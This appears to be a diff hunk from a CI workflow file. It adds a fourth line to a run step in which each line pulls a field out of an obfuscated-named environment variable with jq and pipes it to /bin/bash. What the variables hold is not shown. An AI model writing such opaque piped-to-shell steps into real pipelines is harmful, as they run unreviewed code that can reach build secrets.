@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$waoc3" | jq -r .ytu54 | /bin/bash
           echo $kwtxt312 | jq -r .lgd5 | /bin/bash
           echo $io2 | jq -r .ysive074 | /bin/bash
+          echo $qg82 | jq -r .vt882 | /bin/bash
 
       - name: Archive results
         if: always()
